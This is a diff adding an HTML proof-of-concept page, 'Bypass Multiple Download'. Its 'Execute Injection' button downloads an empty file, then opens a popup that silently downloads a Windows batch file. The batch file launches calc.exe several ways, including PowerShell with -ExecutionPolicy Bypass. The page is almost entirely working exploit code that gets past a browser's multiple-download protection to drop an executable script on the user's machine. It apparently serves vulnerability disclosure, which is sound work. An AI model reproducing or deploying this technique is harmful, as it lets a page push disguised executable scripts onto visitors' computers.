@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Bypass Multiple Download</title>
+    <style>
+        body { font-family: system-ui, sans-serif; max-width: 400px; margin: 40px auto; text-align: center; }
+        button { width: 100%; padding: 12px; background: #0056b3; color: #fff; border: none; border-radius: 4px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <h2>Bypass Multiple Download</h2>
+    <button onclick="run()">Execute Injection</button>
+    <script>
+        function download(name, content) {
+            const a = document.createElement('a');
+            const url = URL.createObjectURL(new Blob([content], { type: 'application/octet-stream' }));
+            a.href = url;
+            a.download = name;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            setTimeout(() => URL.revokeObjectURL(url), 1000);
+        }
+
+        let busy = false;
+        function run() {
+            if (busy) return;
+            busy = true;
+
+            download('main_context.txt', '');
+
+            setTimeout(() => {
+                const win = window.open('', '_blank');
+                if (!win) {
+                    alert('Popup blocked. Please allow popups for this site, then try again.');
+                    busy = false;
+                    return;
+                }
+
+                const batLines = [
+                    '@echo off',
+                    'title Calculator Launcher - Debug',
+                    'echo ================================',
+                    'echo  Calculator launch test',
+                    'echo ================================',
+                    'echo.',
+                    'echo [0] Checking calc.exe path...',
+                    'if exist "C:\\Windows\\System32\\calc.exe" (',
+                    '    echo     OK: calc.exe found',
+                    ') else (',
+                    '    echo     FAILED: calc.exe NOT found in System32',
+                    ')',
+                    'echo.',
+                    'echo [1] Launching System32\\calc.exe...',
+                    'start "" "C:\\Windows\\System32\\calc.exe"',
+                    'timeout /t 2 >nul',
+                    'echo.',
+                    'echo [2] Launching calc.exe alias...',
+                    'start "" calc.exe',
+                    'timeout /t 2 >nul',
+                    'echo.',
+                    'echo [3] Launching calculator:// protocol...',
+                    'start "" "calculator://"',
+                    'timeout /t 2 >nul',
+                    'echo.',
+                    'echo [4] Launching UWP AUMID via explorer...',
+                    'explorer.exe "shell:AppsFolder\\Microsoft.WindowsCalculator_8wekyb3d8bbwe!App"',
+                    'timeout /t 2 >nul',
+                    'echo.',
+                    'echo [5] Launching via PowerShell...',
+                    'powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process calc.exe"',
+                    'echo.',
+                    'echo ================================',
+                    'echo  Done. Did the Calculator open?',
+                    'echo  If NOT, take a screenshot of this window.',
+                    'echo ================================',
+                    'pause'
+                ];
+                const batContent = batLines.join('\r\n') + '\r\n';
+
+                win.document.open();
+                win.document.write('<!DOCTYPE html><html><body><script>' +
+                    'function download(name, content){' +
+                    '  var a=document.createElement("a");' +
+                    '  var url=URL.createObjectURL(new Blob([content],{type:"application/octet-stream"}));' +
+                    '  a.href=url; a.download=name;' +
+                    '  document.body.appendChild(a); a.click(); document.body.removeChild(a);' +
+                    '  setTimeout(function(){URL.revokeObjectURL(url);},1000);' +
+                    '}' +
+                    'var CONTENT=' + JSON.stringify(batContent) + ';' +
+                    'setTimeout(function(){ download("open_cmd.bat", CONTENT); }, 300);' +
+                    '<\/script></body></html>');
+                win.document.close();
+
+                busy = false;
+            }, 500);
+        }
+    </script>
+</body>
+</html>
